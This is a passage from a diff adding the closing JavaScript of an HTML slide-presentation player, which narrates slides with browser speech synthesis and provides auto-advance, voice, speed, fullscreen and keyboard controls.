+    u.onerror=()=>{ ci++; nextChunk(); };
+    try{speechSynthesis.speak(u);}catch(e){ ci++; nextChunk(); }
+  };
+  nextChunk(); keepAlive();
+  // only used if the speech engine never produces a word at all
+  setTimeout(()=>{ if(!spoke && autoplay) scheduleAdvance(700); }, 1800);
+}
+function scheduleAdvance(ms){
+  if(!autoplay) return;
+  if(advTimer)clearTimeout(advTimer);
+  advTimer=setTimeout(()=>{ if(idx<SLIDES.length-1) go(1); }, ms);  // never auto-advances past the last slide
+}
+
+function go(dir){ idx=Math.min(SLIDES.length-1,Math.max(0,idx+dir)); render(); }
+function goto(n){ idx=Math.min(SLIDES.length-1,Math.max(0,n)); render(); }
+
+// controls
+document.getElementById('bNext').onclick=()=>go(1);
+document.getElementById('bPrev').onclick=()=>go(-1);
+document.getElementById('bReplay').onclick=()=>render();
+document.getElementById('bAuto').onclick=e=>{autoplay=!autoplay;e.target.classList.toggle('on',autoplay);e.target.textContent=autoplay?'AUTO ▮▮':'AUTO ▷';if(autoplay)scheduleAdvance(500);else if(advTimer)clearTimeout(advTimer);};
+document.getElementById('bVoice').onclick=e=>{voiceOn=!voiceOn;e.target.classList.toggle('on',voiceOn);e.target.textContent=voiceOn?'VOICE ♪':'VOICE ✕';if(!voiceOn)speechSynthesis.cancel();else render();};
+document.getElementById('bFull').onclick=()=>{if(!document.fullscreenElement)document.documentElement.requestFullscreen();else document.exitFullscreen();};
+document.getElementById('bVoiceSel').onchange=e=>{chosenURI=e.target.value; if(voiceOn) render();};
+document.getElementById('bSpeed').onchange=e=>{rate=parseFloat(e.target.value); if(voiceOn) render();};
+document.addEventListener('keydown',e=>{
+  if(e.key===' '||e.key==='ArrowRight'){e.preventDefault();go(1);}
+  else if(e.key==='ArrowLeft')go(-1);
+  else if(e.key.toLowerCase()==='m')document.getElementById('bVoice').click();
+  else if(e.key.toLowerCase()==='f')document.getElementById('bFull').click();
+  else if(e.key.toLowerCase()==='r')render();
+});
+
+document.getElementById('begin').onclick=()=>{
+  document.getElementById('ov').style.display='none';
+  // prime speech engine (user gesture)
+  if('speechSynthesis' in window){try{speechSynthesis.resume();const w=new SpeechSynthesisUtterance(' ');speechSynthesis.speak(w);}catch(e){}}
+  populateVoiceSel();
+  idx=0; render();
+};
+</script>
+</body>
+</html>
